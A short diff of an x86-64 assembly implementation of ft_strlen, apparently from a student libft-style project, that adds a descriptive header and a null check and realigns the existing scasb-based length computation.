+;;
+;; SYNOPSYS
+;;		size_t	ft_strlen(char *s)
+;;
+;; DESCRIPTION
+;;		Returns the length in byte of the string pointed by s
+;; --------------------------------------------------------------------------------------------
+
+_ft_strlen: 
+	enter	16, 0
+	xor		rax, rax
+	mov		rbx, rdi
+	cmp		rdi, 0
+	je		_strlen_end
+	mov		rcx, -1
 	cld
-	repne scasb
-	sub rdi, rbx
-	mov rax, rdi
-	sub rax, 1
+	repne	scasb
+	sub		rdi, rbx
+	mov		rax, rdi
+	sub		rax, 1
 _strlen_end:
 	leave
 	ret
